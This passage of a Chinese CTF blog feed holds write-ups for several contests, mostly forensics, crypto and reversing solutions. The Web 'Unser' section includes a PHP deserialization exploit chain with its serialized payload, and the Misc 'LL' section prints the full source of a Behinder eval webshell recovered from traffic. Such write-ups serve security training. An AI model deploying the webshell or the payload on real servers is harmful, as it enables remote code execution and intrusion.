Restarts"></a>Blizzard CN Restarts</h3><p>但是没玩过魔兽 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112149143.png" alt="image-20240611214939074"></p><p>找个修改器打开看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112152521.png" alt="image-20240611215201456"></p><p>全部解压出来 使用FileLocator开搜 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112151089.png" alt="image-20240611215156030"></p><h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="TPA-01"><a href="#TPA-01" class="headerlink" title="TPA 01"></a>TPA 01</h3><p>e01镜像 直接丢进火眼 分析出个嵌套证据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112032961.png" alt="image-20240611203233869"></p><p>其实做这个题的时候分析过程还挺复杂的 感觉想的过于复杂了 归其原因还是经验太少 我甚至仿真起来了</p><p>翻文件夹的时候找到wsl 在结合嵌套证据 感觉预期解应该是要把这个系统恢复出来  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112050449.png" alt="image-20240611205056379"></p><p>但是好在有取证工具 不用恢复出来也可以做 下面就是由于我翻文件系统不仔细发现的另一种途径</p><p>010直接把密文翻出来了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112055098.png" alt="image-20240611205514050"></p><p>但是在火眼里面直接能看到 还能看到一个关于密钥的提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112056901.png" alt="image-20240611205601842"></p><pre><code>key：Do you like watch videos on youtube?Something fun there:https://www.youtube.com/@d3f4u1t-lololF14G：Hi players,welcome !Ops,what&#39;s that?2d422fc7f2c628c55520984c0673964eb5454dea72f79b1022a34728294c5bf8I guess u need a key to decrypt it.SELECT something FROM somewhere with the windows10 lol~</code></pre><p>根据提示 <code>SELECT something FROM somewhere</code> 想到应该和sql语句有点关系</p><p>先看一下key里面提到的视频</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112058291.png" alt="image-20240611205806214"></p><p>有个字符串 提出来看看</p><pre><code>0x6d617962652075206e6565642c746861742773206e6f74206162736f6c7574650a726f6f743a5040357357307264466f7255maybe u need,that&#39;s not absoluteroot:P@5sW0rdForU</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112058384.png" alt="image-20240611205838309"></p><p>给了个密码 尝试登陆mysql 成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112119979.png" alt="image-20240611211910791"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112119328.png" alt="image-20240611211951295"></p><pre><code>select * from secret;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112120733.png" alt="image-20240611212016645"></p><p>FFD8的头 一眼jpg图片 保存下来 给出了AES解密的key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112120597.png" alt="image-20240611212052560"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112121765.png" alt="image-20240611212115703"></p><p>其实这里也可以用一个项目<a href="https://github.com/ddcw/ibd2sql">ibd2sql</a>来解密数据库<code>secret.ibd</code>也可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112128083.png" alt="image-20240611212802969"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112128912.png" alt="image-20240611212855289"></p><h3 id="TPA-02-📱"><a href="#TPA-02-📱" class="headerlink" title="TPA 02 - 📱"></a>TPA 02 - 📱</h3><pre><code>Peggy is an employee at a company and, like many others, occasionally uses her personal mobile phone for work-related tasks. Unfortunately, she has become the target of a phishing attack. Your task is to uncover the details of this attack by finding the attacker&#39;s phone number and Peggy&#39;s password.Submit your findings in the format r3ctf&#123;number_password&#125;. For the phone number, remove any symbols and spaces. For example, if the attacker&#39;s phone number is +1 123-456-7890 and the password Peggy entered is passwd, your flag should be r3ctf&#123;11234567890_passwd&#125;.</code></pre><p>两部分 一个是找攻击者的手机号码 一个是找Peggy的登陆密码</p><p>先看流量 直接追踪tcp流 在第31个流 找到login登录页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112012655.png" alt="image-20240611201202596"></p><p>先找到password:l0v3_aNd_peace</p><p>再看给的手机文件夹 直接用火眼分析 分析出两个手机号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112015219.png" alt="image-20240611201527146"></p><p>根据语境 可以得知是15555215556这个号码应该是Peggy的同事 来询问Peggy是否也收到了钓鱼信息</p><p>那下面的15555215558 应该就是攻击者的手机号码 直接组合起来</p><pre><code>r3ctf&#123;15555215558_l0v3_aNd_peace&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;R3CTF&quot;&gt;&lt;a href=&quot;#R3CTF&quot; class=&quot;headerlink&quot; title=&quot;R3CTF&quot;&gt;&lt;/a&gt;R3CTF&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>第二届黄河流域网络攻防竞赛</title>
    <link href="http://w3nx1z1.github.io/2024/06/11/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F-%E8%A5%BF%E6%9F%9A%E5%96%B5%E5%B8%95%E6%96%AF/"/>
    <id>http://w3nx1z1.github.io/2024/06/11/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F-%E8%A5%BF%E6%9F%9A%E5%96%B5%E5%B8%95%E6%96%AF/</id>
    <published>2024-06-11T09:43:23.752Z</published>
    <updated>2024-06-11T11:30:24.022Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二届黄河流域-西柚喵帕斯"><a href="#第二届黄河流域-西柚喵帕斯" class="headerlink" title="第二届黄河流域-西柚喵帕斯"></a><strong>第二届黄河流域-西柚喵帕斯</strong></h1><h2 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a><strong>取证分析</strong></h2><h3 id="内存取证1"><a href="#内存取证1" class="headerlink" title="内存取证1"></a><strong>内存取证1</strong></h3><pre><code>问题1：桌面上表格文件是什么？提交答案格式为flag&#123;带后缀名的敏感文件名称&#125;，比如flag&#123;敏感文件.xls&#125;</code></pre><p>使用r-studio打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722408.jpg" alt="img"> </p><h3 id="内存取证2"><a href="#内存取证2" class="headerlink" title="内存取证2"></a><strong>内存取证2</strong></h3><pre><code>问题2：JohnDoe用户登录mysql密码是多少？提交答案格式为flag&#123;登录密码&#125;，比如flag&#123;root&#125;。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722022.jpg" alt="img"> </p><h3 id="内存取证3"><a href="#内存取证3" class="headerlink" title="内存取证3"></a><strong>内存取证3</strong></h3><pre><code>问题3：找到镜像中隐藏的flag，提交答案格式为flag&#123;中文&#125;</code></pre><p>从第一题找到的xls入手分析</p><p>先导出分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722023.jpg" alt="img"> </p><p>改xls后缀名 打开要密码 尝试用上面的mysql登录密码 打开找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021282.jpg" alt="img"> </p><p>utf-7编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722024.jpg" alt="img"> </p><h3 id="取证分析1"><a href="#取证分析1" class="headerlink" title="取证分析1"></a><strong>取证分析1</strong></h3><pre><code>某单位员工使用edge浏览器访问了钓鱼站点，导致edge进程崩溃了，员工的电脑上设置了程序崩溃自动保存内存dump文件。请通过该文件，对该事件进行分析。 问题1：小A访问的钓鱼网站网址是什么？提交答案格式为flag&#123;url&#125;，比如flag&#123;http://a.b.c.d:1234/x.html&#125;</code></pre><p>vol和AXIOM都分析不了 只能直接strings </p><p>Plain Text strings edge.dmp | grep “http:&#x2F;&#x2F;“</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021285.jpg" alt="img"> </p><h3 id="取证分析2"><a href="#取证分析2" class="headerlink" title="取证分析2"></a><strong>取证分析2</strong></h3><pre><code>问题2：对方在edge进程中执行了shellcode，似乎是执行命令失败了，找出他执行命令调用的win32 api。提交答案格式为flag&#123;api&#125;，比如flag&#123;kernel32!RtlCaptureContext&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021771.jpg" alt="img"> </p><p>Bash kernel32!WinExec</p><h3 id="取证分析3"><a href="#取证分析3" class="headerlink" title="取证分析3"></a><strong>取证分析3</strong></h3><pre><code>问题3：找出对方想要执行的命令行内容，提交答案格式为flag&#123;钓鱼站点想要执行的命令行内容&#125;，命令中若存在空格请使用_代替，其他符号不变，区分大小写，格式如flag&#123;cmd_/c_ip_tables!&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021777.jpg" alt="img"> </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="Easyrsa"><a href="#Easyrsa" class="headerlink" title="Easyrsa"></a><strong>Easyrsa</strong></h3><pre><code>from itertools import permutations from Crypto.Util.number import *  zc = 13003314666259100924056004488192879951991824059911508262140097706018888705955470264051361935101455340094971529836127008746457786892275972565449113840328391209339169000395470738780766025271862970759571146381234096267258200970822986151050047882589038375903133053657805275788419550498651112234266443422536799276888423014856283593968916394415760552426237539489292338903806512371485857542164997008922471994591413796274552848851859976522014922044409925823881793117165653534217369362159387632321283129023449326780775659395803089477090226867368824000190350663854144716638637456141115609096321561091304903356851544525526615903 e = 65537  for perm in permutations(z, r=8):   group1 = perm[:4]    group2 = perm[4:]      p_str = &#39;&#39;.join(group1)   q_str = &#39;&#39;.join(group2)    p = int(p_str, 2)   q = int(q_str, 2)    phi_n = (p - 1) * (q - 1)   d = pow(e, -1, phi_n) if phi_n != 0 else None    if d is None:     continue   m = pow(c, d, p * q)    decrypted_message = long_to_bytes(m)   if b&#39;flag&#39; in decrypted_message:     print(decrypted_message)     break </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021781.jpg" alt="img"> </p><h3 id="Ecc"><a href="#Ecc" class="headerlink" title="Ecc"></a><strong>Ecc</strong></h3><p>板子题</p><pre><code>from Crypto.Util.number import * #1 p = 49383540788757109209399937015403058078091585436614706959465496296978436108887 a = 55685723875233231914244109412725461970324405506250247848835714736428531894083 b = 14465416621366336584787787222004413359301857947979225099379614554383512880491 k = 17863723127130927912437094121795715840619733807126707833630214910470361917913 E = EllipticCurve(GF(p),[a,b]) c1 = E([41878742451091353952894887712068645971005265624587580702506356899238014833578, 33882347397378893053663991901529711743049843524447349970546724946010958254490]) c2 = E([32044441001201280220364823846903588184438951716534669244501751822900705328405, 20808501842510819101565506724685661870434821018672081897206182291278825489793]) cipher = 8126088154459418019024039065681028044223135048676741656267021276727337263061 m = c1 - k * c2 num1 = cipher//m[0]   # 2 p=12506217790875063466368723611056175369923 A=12506217790875063466368723611052784275139 B=12506217790875063466368723533070038257347 E = EllipticCurve(GF(p),[A,B]) P = E(12209581121985501571384146459209070740325, 343933414533064030464400914099323495391) Q = E(6578542526388549877571325989098572012221, 1792660825364939960209890135582772010119)  def SmartAttack(P,Q,p):   E = P.curve()   Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)   for P_Qp in P_Qps:     if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:       break    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)   for Q_Qp in Q_Qps:     if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:       break    p_times_P = p*P_Qp   p_times_Q = p*Q_Qp    x_P,y_P = p_times_P.xy()   x_Q,y_Q = p_times_Q.xy()    phi_P = -(x_P/y_P)   phi_Q = -(x_Q/y_Q)   k = phi_Q/phi_P   return ZZ(k)  num2 = SmartAttack(P, Q, p)  print(long_to_bytes(int(num1))+long_to_bytes(int(num2)))</code></pre><p><a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132005590#_2021ecc_209">https://blog.csdn.net/XiongSiqi_blog/article/details/132005590#_2021ecc_209</a></p><p>分别是HGAME2022week4 ECC和 第五空间2021 ecc的第三部分</p><pre><code>flag&#123;1eo0kuvanq6vghtlpswe&#125;</code></pre><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="Unser"><a href="#Unser" class="headerlink" title="Unser"></a><strong>Unser</strong></h3><p>原题 没什么好说的  照着打就行了</p><p><a href="https://blog.csdn.net/qq_51768842/article/details/125153850">https://blog.csdn.net/qq_51768842/article/details/125153850</a></p><pre><code>poc  &lt;?php   highlight_file(__FILE__);   class wel &#123;   public $fast;   public $star;     public function __construct()   &#123;     $this-&gt;fast = &#39;free__toto&#39;;     echo $this-&gt;fast;     echo &quot;what?&quot;;   &#125;     public function __destruct()   &#123;     $content = $this-&gt;star;     printf($content);   &#125;     public function ctf()   &#123;     echo &#39;welcome?&#39;;   &#125;   &#125;   class  database &#123;   public $hostname = &#39;127.0.0.1&#39;;   public $dbuser = &#39;root&#39;;   public $dbpass = &#39;root&#39;;   public $database;   public $str;   public $challange;     public function __construct($database)   &#123;     $this-&gt;database = $database;   &#125;     public function __invoke()   &#123;     function welcome()     &#123;       echo &#39;do_it?&#39;;     &#125;       $this-&gt;str-&gt;open($this-&gt;database);     &#125;   &#125;   class flag &#123;   public $file;   public $params;     public function __construct()   &#123;     $this-&gt;file = array();   &#125;     public function __toString()   &#123;     return $this-&gt;getfunction();   &#125;     public function getfunction()   &#123;     $func = $this-&gt;params;     echo &#39;you win?&#39;;     $func();   &#125;   &#125;   $w=new wel(); $w-&gt;star=new flag(); $w-&gt;star-&gt;params=new database(&#39;fl@g.php&#39;); $w-&gt;star-&gt;params-&gt;str=new SQLite3(&#39;fl@g.php&#39;); echo serialize($w);</code></pre><pre><code>exp  noway=O:3:&quot;wel&quot;:2:&#123;s:4:&quot;fast&quot;;s:10:&quot;free__toto&quot;;s:4:&quot;star&quot;;O:4:&quot;flag&quot;:2:&#123;s:4:&quot;file&quot;;a:0:&#123;&#125;s:6:&quot;params&quot;;O:8:&quot;database&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:8:&quot;fl@g.php&quot;;s:3:&quot;str&quot;;O:7:&quot;SQLite3&quot;:0:&#123;&#125;s:9:&quot;challange&quot;;N;&#125;&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722025.jpg" alt="img"> </p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a><strong>easyre</strong></h3><p>有py特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021816.jpg" alt="img"> </p><p>转储</p><p>Bash objcopy –dump-section pydata&#x3D;pydata.dump file.elf</p><p>再用pyinstxtractor拆包</p><p>拿到pyc文件反编译看源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722026.jpg" alt="img"> </p><p>import了一叫touch的so库文件</p><p>定位到jiami函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021944.jpg" alt="img"> </p><p>定位密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021343.jpg" alt="img"> </p><p>exp:</p><p>Python print(‘’.join([chr(i&#x2F;&#x2F;2 ^ 0x25) for i in [0x86, 0x92, 0x88, 0x84, 0xBC, 0xEA, 0xB8, 0xF4, 0x28, 0x2C, 0xF4, 0x2C, 0xCA, 0xAC, 0xB8, 0xF4, 0xC2, 0x2A, 0x96, 0x24, 0xF4, 0xE2, 0x2A, 0xA0, 0x2E, 0x9A, 0xF4, 0xD0, 0x2C, 0xF4, 0xC8, 0x84, 0x88, 0x98, 0x96, 0x08, 0xB0]]))</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="LL"><a href="#LL" class="headerlink" title="LL"></a><strong>LL</strong></h3><p>发现问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722027.jpg" alt="img"> </p><p>搜一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722028.jpg" alt="img"> </p><p>第105流 得知解密流程分3步</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021694.jpg" alt="img"> </p><p>在第104流找到密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021963.jpg" alt="img"> </p><p>直接赛博厨子解<a href="https://wikipedia.org/wiki/Quoted-printable">Quoted-printable</a> 解密后的内容单独保存出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021374.jpg" alt="img"> </p><p>看着像base64 继续解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722029.jpg" alt="img"> </p><p>这里发现又将一个base64的内容写入了about.php中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722031.jpg" alt="img"> </p><p>继续解base64 是一个冰蝎解密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021431.jpg" alt="img"> </p><pre><code>&lt;?php @error_reporting(0); session_start();   $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond     $_SESSION[&#39;k&#39;]=$key;     session_write_close();     $post=file_get_contents(&quot;php://input&quot;);     if(!extension_loaded(&#39;openssl&#39;))     &#123;         $t=&quot;base64_&quot;.&quot;decode&quot;;         $post=$t($post.&quot;&quot;);                  for($i=0;$i&lt;strlen($post);$i++) &#123;                $post[$i] = $post[$i]^$key[$i+1&amp;15];                &#125;     &#125;     else     &#123;         $post=openssl_decrypt($post, &quot;AES128&quot;, $key);     &#125;   $arr=explode(&#39;|&#39;,$post);   $func=$arr[0];   $params=$arr[1];     class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;   @call_user_func(new C(),$params); ?&gt;</code></pre><p>得知密码是rebeyond 直接用puzzlesolver就可以爆破解密</p><p>直接翻到最后一个流 先解密请求包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021544.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021955.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722032.jpg" alt="img"> </p><p>两次base64解密 发现确实是在读取flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021115.jpg" alt="img"> </p><p>那最后一个返回包就是flag的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722033.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722034.jpg" alt="img"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二届黄河流域-西柚喵帕斯&quot;&gt;&lt;a href=&quot;#第二届黄河流域-西柚喵帕斯&quot; class=&quot;headerlink&quot; title=&quot;第二届黄河流域-西柚喵帕斯&quot;&gt;&lt;/a&gt;&lt;strong&gt;第二届黄河流域-西柚喵帕斯&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;取证分析</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="crypto" scheme="http://w3nx1z1.github.io/tags/crypto/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>第七届精武杯-西柚喵帕斯wp</title>
    <link href="http://w3nx1z1.github.io/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/"/>
    <id>http://w3nx1z1.github.io/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/</id>
    <published>2024-05-03T14:14:23.575Z</published>
    <updated>2024-05-03T14:15:10.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七届精武杯-西柚的喵帕斯WP"><a href="#第七届精武杯-西柚的喵帕斯WP" class="headerlink" title="第七届精武杯-西柚的喵帕斯WP"></a>第七届精武杯-西柚的喵帕斯WP</h1><p><strong>计算机&amp;&amp;手机</strong></p><p><strong>1. 请综合分析计算机和手机检材，计算机最近一次登录的账户名是</strong></p><pre><code>admin</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730494.jpg" alt="img"> </p><p><strong>2.请综合分析计算机和手机检材，计算机最近一次插入的USB存储设备串号是</strong></p><pre><code>S3JKNX0JA05097Y</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730353.jpg" alt="img"> </p><p><strong>3.请综合分析计算机和手机检材，谢弘的房间号是（）室</strong></p><pre><code>201</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730356.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730364.jpg" alt="img"> </p><p><strong>4.请综合分析计算机和手机检材，曹锦芳的手机号后四位是</strong></p><pre><code>0683</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945444.jpg" alt="img"></p><h3 id="5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？"><a href="#5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？" class="headerlink" title="5.请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？"></a>5.<strong>请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？</strong></h3><pre><code>4997条</code></pre><p>全部提取出来 其中顺丰2k是伪加密 改一下就可以正常解压 顺丰1k直接修改后缀名为<code>xlsx</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261733131.png" alt="image-20240426173356074"></p><p>使用网钜数据分析 导入4个excel表格</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261735436.png" alt="image-20240426173535343"></p><p>由于没有表头 所以需要再算上第一行 一共是4997条数据</p><p><strong>6.请综合分析计算机和手机检材，统计检材内共有几份购票平台相关的公民信息文档</strong></p><p>3份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731735.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731736.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945290.jpg" alt="img"> </p><p><strong>7.请综合分析计算机和手机检材，樊海锋登记的邮箱账号是</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945827.jpg" alt="img"> </p><p><strong>8.请综合分析计算机和手机检材，统计购票平台相关的文档，去重后共有多少条身份证号为上海的公民信息？</strong></p><p>先搜一下身份证为上海的特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731743.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731754.jpg" alt="img"> </p><pre><code class="python">import pandas as pd  # 读取txt文件 data = pd.read_csv(&#39;12306 裤子1.txt&#39;, delimiter=&#39;----&#39;, header=None, engine=&#39;python&#39;)  # 将数据存储到xlsx文件中 data.to_excel(&#39;output.xlsx&#39;, index=False)  # 对第四列进行去重处理 data.drop_duplicates(subset=[3], keep=&#39;first&#39;, inplace=True)  # 筛选出上海公民shanghai_citizens = data[data[3].str.startswith(&#39;31&#39;)]  # 将上海公民的数据存储到一个新的xlsx文件中 shanghai_citizens.to_excel(&#39;shanghai_citizens.xlsx&#39;, index=False) </code></pre><p>跑出来109个</p><p><strong>9.请分析手机检材，2022年11月7日，嫌疑人发送了几条短信？</strong></p><p>3条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731916.jpg" alt="img"> </p><p><strong>10.请分析手机检材，其中保存了多少条公民住房信息？</strong></p><p>张三 李四 王武 范宏伟 郭何 章衡 关星 常见 余辉遥 陈剑 吴涵 张智  12个人 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731003.jpg" alt="img"></p><h2 id="apk功能分析"><a href="#apk功能分析" class="headerlink" title="apk功能分析"></a>apk功能分析</h2><h3 id="1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？"><a href="#1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？" class="headerlink" title="1、请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？"></a>1、<strong>请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032156946.png" alt="图片"></p><h3 id="2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）"><a href="#2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）" class="headerlink" title="2、请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）"></a>2、<strong>请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）</strong></h3><pre><code class="Plain">com.hl.memorandum.MainActivity</code></pre><h3 id="3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;d0b2058a-ac29-11ed-807f-acde48001122&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157566.png" alt="图片"></p><h3 id="4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么"><a href="#4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么" class="headerlink" title="4、请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?"></a>4、<strong>请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?</strong></h3><p>MT管理器查看data&#x2F;data&#x2F;&lt;包名&gt;&#x2F;shared_prefs&#x2F;</p><pre><code class="Plain">myprefs.xml</code></pre><h3 id="5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;55c99ed4-d894-ae59-3a3b-6fe3eed793e7&#125;</code></pre><p>看一下发现equal明文比对</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157866.png" alt="图片"></p><p>用frida hook equal函数拦截返回值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157414.png" alt="图片"></p><p>其实还有一个思路直接去找对应的str1-str5的值</p><h3 id="6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为"><a href="#6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为" class="headerlink" title="6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为"></a>6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157389.png" alt="图片"></p><h3 id="7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" 